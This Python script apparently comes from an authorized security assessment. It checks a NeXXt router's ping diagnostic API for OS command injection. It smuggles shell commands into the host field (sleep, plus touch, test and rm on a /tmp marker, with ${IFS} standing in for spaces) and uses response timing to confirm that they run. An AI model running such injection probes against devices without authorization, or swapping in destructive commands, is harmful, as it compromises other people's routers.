#!/usr/bin/env python3
"""Phase-B: non-persistent backend verification for the local NeXXt ping API.

Authorized scope (see project notes): prove whether the ping diagnostic passes
shell metacharacters to a command interpreter, using ONLY harmless probes:

  1. timing probe  -> host ":::::::;sleep${IFS}<N>" (pure delay, no writes)
  2. marker create -> host ":::::::;touch${IFS}/tmp/<rand>"
  3. marker check  -> host ":::::::;test${IFS}-f${IFS}/tmp/<rand>&&sleep${IFS}<N>"
  4. cleanup       -> host ":::::::;rm${IFS}-f${IFS}/tmp/<rand>" + re-check

No passwords, firewall rules, UCI values, services or startup entries are
touched. The marker lives only in /tmp (tmpfs) and is removed by step 4.

This code was written from scratch for this project; no community exploit
code is used.
"""

from __future__ import annotations

import argparse
import json
import os
import random
import string
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from nexxt_session import NexxtClient  # noqa: E402

PING_SETTLE_TIMEOUT = 45.0
POLL_INTERVAL = 1.0
SLEEP_SECONDS = 10
TIMING_THRESHOLD = 5.0  # extra seconds that count as "sleep executed"


def run_ping(client: NexxtClient, host: str) -> tuple[float, dict]:
    """Submit a ping request and measure seconds until DiagnosticsState leaves
    the Requested/running states."""
    status, data = client.set("pingstatus", host=host, state="Requested", name="ping")
    if status != 200:
        return -1.0, {"submit_http": status, "submit_response": data}
    start = time.time()
    last: dict = {}
    while time.time() - start < PING_SETTLE_TIMEOUT:
        time.sleep(POLL_INTERVAL)
        status, data = client.get("pingstatusinfo")
        last = data.get("pingstatusinfo", data)
        state = str(last.get("DiagnosticsState", ""))
        if state and state not in {"Requested", "InProgress", "None"}:
            break
    elapsed = time.time() - start
    return elapsed, last


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", default="https://192.168.1.254")
    args = parser.parse_args()

    client = NexxtClient(args.base_url, timeout=10.0)
    if not client.is_authenticated():
        print(json.dumps({"error": "not authenticated"}, indent=2))
        return 1

    marker = "/tmp/nx_b_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    report: dict[str, object] = {
        "marker": marker,
        "sleep_seconds": SLEEP_SECONDS,
        "steps": [],
    }

    def step(name: str, host: str) -> tuple[float, dict]:
        elapsed, info = run_ping(client, host)
        report["steps"].append({"step": name, "host": host, "elapsed_s": round(elapsed, 2),
                                "final_state": info.get("DiagnosticsState"),
                                "success_count": info.get("SuccessCount")})
        print(f"[phaseB] {name}: {elapsed:.1f}s state={info.get('DiagnosticsState')}", flush=True)
        return elapsed, info

    # 1. baseline
    base1, _ = step("baseline-1", "127.0.0.1")
    base2, _ = step("baseline-2", "127.0.0.1")
    baseline = max(base1, base2)

    # 2. timing probe: does an injected sleep delay completion?
    t_sleep, _ = step("timing-sleep", f":::::::;sleep${{IFS}}{SLEEP_SECONDS}")
    timing_injection = t_sleep > baseline + TIMING_THRESHOLD

    # 3. marker lifecycle
    step("marker-create", f":::::::;touch${{IFS}}{marker}")
    t_check1, _ = step(
        "marker-check-1",
        f":::::::;test${{IFS}}-f${{IFS}}{marker}&&sleep${{IFS}}{SLEEP_SECONDS}",
    )
    marker_existed = t_check1 > baseline + TIMING_THRESHOLD

    step("marker-delete", f":::::::;rm${{IFS}}-f${{IFS}}{marker}")
    t_check2, _ = step(
        "marker-check-2-after-delete",
        f":::::::;test${{IFS}}-f${{IFS}}{marker}&&sleep${{IFS}}{SLEEP_SECONDS}",
    )
    marker_gone = t_check2 <= baseline + TIMING_THRESHOLD

    report["result"] = {
        "baseline_s": round(baseline, 2),
        "timing_sleep_s": round(t_sleep, 2),
        "timing_injection_observed": timing_injection,
        "marker_check1_s": round(t_check1, 2),
        "marker_existed": marker_existed,
        "marker_check2_after_delete_s": round(t_check2, 2),
        "marker_deleted_confirmed": marker_gone,
        "backend_command_execution": bool(timing_injection and marker_existed and marker_gone),
    }
    print(json.dumps(report, indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    sys.exit(main())
